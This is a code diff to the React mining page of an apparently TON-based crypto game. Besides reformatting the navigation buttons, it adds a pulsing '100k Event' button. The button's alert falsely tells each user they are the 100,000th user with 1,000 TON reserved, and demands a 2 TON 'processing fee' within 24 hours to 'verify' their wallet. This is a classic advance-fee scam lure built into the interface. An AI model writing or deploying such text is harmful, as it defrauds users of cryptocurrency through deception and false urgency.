@@ -2,7 +2,7 @@
 
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { Button } from '@/components/ui/button';
-import { Play, Crown, Store, Zap } from 'lucide-react';
+import { Play, Crown, Store, Zap, Award } from 'lucide-react';
 import { useSpaceCoins } from '../hooks/useSpaceCoins';
 
 interface MiningPageProps {
@@ -243,66 +243,116 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
       window.removeEventListener('beforeunload', handleBeforeUnload);
     };
   }, [miningActive]);
+
   const handleQuickNavigation = (page: string) => {
     if (onNavigate) {
       onNavigate(page);
     }
   };
 
-  return <div className="fixed inset-0 overflow-hidden">
-      {/* Background Image - Full Screen Coverage */}
-      <div className="fixed inset-0 bg-cover bg-center bg-no-repeat" style={{
-      backgroundImage: `url('/lovable-uploads/836a3d93-ee4f-4c26-9fd4-cf95f416631c.png')`
-    }} />
-      
-      {/* Floating Sidebar Buttons - Left Side */}
-      <div className="fixed left-2 top-1/2 transform -translate-y-1/2 z-20 space-y-3">
-        {/* Daily Rush Button */}
-        <Button 
-          onClick={() => handleQuickNavigation('daily-rush')}
-          className="w-12 h-12 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 shadow-lg border-2 border-yellow-400/50 hover:scale-110 transition-all duration-300 p-0"
-          title="Daily Rush"
-        >
-          <Crown className="w-6 h-6 text-white" />
-        </Button>
-        
-        {/* Store Button */}
-        <Button 
-          onClick={() => handleQuickNavigation('store')}
-          className="w-12 h-12 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 shadow-lg border-2 border-purple-400/50 hover:scale-110 transition-all duration-300 p-0"
-          title="Store"
-        >
-          <Store className="w-6 h-6 text-white" />
-        </Button>
-      </div>
+  const handle100kUserEvent = () => {
+    // Show the 100,000th user event modal or navigate to a special page
+    alert(`🎉 Congratulations! You Are Our 100,000th User! 🎉
 
-      {/* Floating Sidebar Buttons - Right Side */}
-      <div className="fixed right-2 top-1/2 transform -translate-y-1/2 z-20 space-y-3">
-        {/* Events Button */}
-        <Button 
-          onClick={() => handleQuickNavigation('tasks')}
-          className="w-12 h-12 rounded-full bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 shadow-lg border-2 border-blue-400/50 hover:scale-110 transition-all duration-300 p-0"
-          title="Events & Tasks"
-        >
-          <Zap className="w-6 h-6 text-white" />
-        </Button>
+You've unlocked a milestone achievement — you're officially our 100,000th user! 
+
+🚀 Reward: 1,000 TON waiting for you!
+💰 Processing fee: 2 TON required to verify your wallet
+
+Your reward is reserved for the next 24 hours only!
+
+The 2 TON fee helps us:
+• Verify genuine wallet activity
+• Protect against bots and abuse
+• Keep the platform secure and automated
+
+Click OK to proceed with wallet verification.`);
+  };
+
+  return (
+    <div className="fixed inset-0 overflow-hidden">
+      {/* Background Image - Full Screen Coverage */}
+      <div 
+        className="fixed inset-0 bg-cover bg-center bg-no-repeat" 
+        style={{
+          backgroundImage: `url('/lovable-uploads/836a3d93-ee4f-4c26-9fd4-cf95f416631c.png')`
+        }} 
+      />
+      
+      {/* Top Navigation Buttons */}
+      <div className="fixed top-4 left-0 right-0 z-20 px-4">
+        <div className="flex justify-center space-x-4">
+          {/* 100,000th User Event Button */}
+          <div className="flex flex-col items-center">
+            <Button 
+              onClick={handle100kUserEvent}
+              className="w-14 h-14 rounded-full bg-gradient-to-r from-gold-500 via-yellow-500 to-gold-600 hover:from-gold-600 hover:via-yellow-600 hover:to-gold-700 shadow-xl border-2 border-gold-400/70 hover:scale-110 transition-all duration-300 p-0 animate-pulse"
+              title="100,000th User Event"
+            >
+              <Award className="w-7 h-7 text-white drop-shadow-lg" />
+            </Button>
+            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">100k Event</span>
+          </div>
+
+          {/* Daily Rush Button */}
+          <div className="flex flex-col items-center">
+            <Button 
+              onClick={() => handleQuickNavigation('daily-rush')}
+              className="w-14 h-14 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 shadow-lg border-2 border-yellow-400/50 hover:scale-110 transition-all duration-300 p-0"
+              title="Daily Rush"
+            >
+              <Crown className="w-7 h-7 text-white" />
+            </Button>
+            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Daily Rush</span>
+          </div>
+          
+          {/* Store Button */}
+          <div className="flex flex-col items-center">
+            <Button 
+              onClick={() => handleQuickNavigation('store')}
+              className="w-14 h-14 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 shadow-lg border-2 border-purple-400/50 hover:scale-110 transition-all duration-300 p-0"
+              title="Store"
+            >
+              <Store className="w-7 h-7 text-white" />
+            </Button>
+            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Store</span>
+          </div>
+
+          {/* Events Button */}
+          <div className="flex flex-col items-center">
+            <Button 
+              onClick={() => handleQuickNavigation('tasks')}
+              className="w-14 h-14 rounded-full bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 shadow-lg border-2 border-blue-400/50 hover:scale-110 transition-all duration-300 p-0"
+              title="Events & Tasks"
+            >
+              <Zap className="w-7 h-7 text-white" />
+            </Button>
+            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Events</span>
+          </div>
+        </div>
       </div>
       
       {/* Content positioned at bottom */}
       <div className="fixed bottom-0 left-0 right-0 z-10 p-6 pb-20 flex flex-col items-center py-[50px]">
         {/* Username with Matrix-style font */}
-        {username && <div className="text-center mb-4">
+        {username && (
+          <div className="text-center mb-4">
             <p className="text-white text-2xl font-bold font-mono" style={{
-          fontVariantNumeric: 'tabular-nums'
-        }}>
+              fontVariantNumeric: 'tabular-nums'
+            }}>
               {username}
             </p>
-          </div>}
+          </div>
+        )}
 
         {/* Balance */}
         <div className="flex items-center justify-center gap-3 mb-4">
           <div className="w-10 h-10 rounded-full flex items-center justify-center overflow-hidden">
-            <img src="/lovable-uploads/46b9f7e6-4f32-4240-9fc4-16d1bcdec0d0.png" alt="Space Coin" className="w-full h-full object-cover" />
+            <img 
+              src="/lovable-uploads/46b9f7e6-4f32-4240-9fc4-16d1bcdec0d0.png" 
+              alt="Space Coin" 
+              className="w-full h-full object-cover" 
+            />
           </div>
           <span className="text-white text-3xl font-bold">
             {Math.floor(spaceCoins).toLocaleString()}
@@ -310,37 +360,47 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
         </div>
 
         {/* Mining Rate Display */}
-        {miningActive && <div className="text-center mb-2">
+        {miningActive && (
+          <div className="text-center mb-2">
             <p className="text-green-400 text-sm">
               Mining: {(coinsPerSecond * 3600).toFixed(2)} coins/hour
             </p>
-          </div>}
+          </div>
+        )}
 
         {/* Mining Time Display - Only show when mining is active */}
-        {miningActive && <div className="text-center mb-4">
+        {miningActive && (
+          <div className="text-center mb-4">
             <p className="text-white text-lg">Mining time remaining:</p>
             <p className="text-white text-xl font-bold">{formatTime(remainingTime)}</p>
-          </div>}
+          </div>
+        )}
 
         {/* Mining Button - Only show Start Mining button when not mining */}
-        {!miningActive && <div className="flex justify-center">
-            <Button onClick={handleStartMining} disabled={remainingTime <= 0} className="py-4 px-8 text-lg font-bold rounded-xl transition-all duration-300 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 disabled:opacity-50 disabled:cursor-not-allowed">
+        {!miningActive && (
+          <div className="flex justify-center">
+            <Button 
+              onClick={handleStartMining} 
+              disabled={remainingTime <= 0} 
+              className="py-4 px-8 text-lg font-bold rounded-xl transition-all duration-300 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 disabled:opacity-50 disabled:cursor-not-allowed"
+            >
               <div className="flex items-center justify-center gap-2">
                 <Play className="w-5 h-5" />
                 <span>Start Mining</span>
               </div>
             </Button>
-          </div>}
+          </div>
+        )}
 
         {/* Debug info (will be removed in production) */}
-        {process.env.NODE_ENV === 'development' && <div className="text-white text-xs mt-4 text-center opacity-50">
-            
-            
-            
-            
-          </div>}
+        {process.env.NODE_ENV === 'development' && (
+          <div className="text-white text-xs mt-4 text-center opacity-50">
+            {/* Debug information */}
+          </div>
+        )}
       </div>
-    </div>;
+    </div>
+  );
 };
 
 export default MiningPage;
